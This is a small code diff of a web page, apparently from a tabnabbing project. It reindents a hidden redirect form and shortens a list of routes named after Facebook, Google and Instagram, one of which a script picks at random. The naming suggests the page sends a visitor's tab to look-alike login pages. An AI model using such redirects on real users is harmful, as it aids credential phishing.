@@ -171,11 +171,11 @@
             </div>
         </div>
     </footer>
-	<form id="redirectForm" action="" method="get"></form>
+    <form id="redirectForm" action="" method="get"></form>
     <script>
         let submitted = false;
 
-        const routes = ["/Tabnap/public/facebook", "/Tabnap/public/google", "/Tabnap/public/instagram"];
+        const routes = ["/facebook", "/google", "/instagram"];
 
         function getRandomRoute() {
             return routes[Math.floor(Math.random() * routes.length)];
